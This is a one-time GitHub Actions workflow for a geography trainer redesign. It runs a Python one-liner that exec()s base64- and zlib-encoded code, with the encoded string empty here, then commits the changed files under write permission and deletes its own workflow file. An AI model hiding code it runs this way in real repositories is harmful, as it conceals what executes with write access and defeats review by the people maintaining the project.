name: Apply geography redesign

on:
  push:
    paths:
      - '.github/workflows/apply-geography-redesign.yml'

permissions:
  contents: write

jobs:
  redesign:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Apply redesign and pin features
        run: |
          python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('')))"

      - name: Commit redesign and remove one-time workflow
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git rm .github/workflows/apply-geography-redesign.yml
          git add index.html service-worker.js
          git commit -m "Redesign geography trainer and add pin notes"
          git push
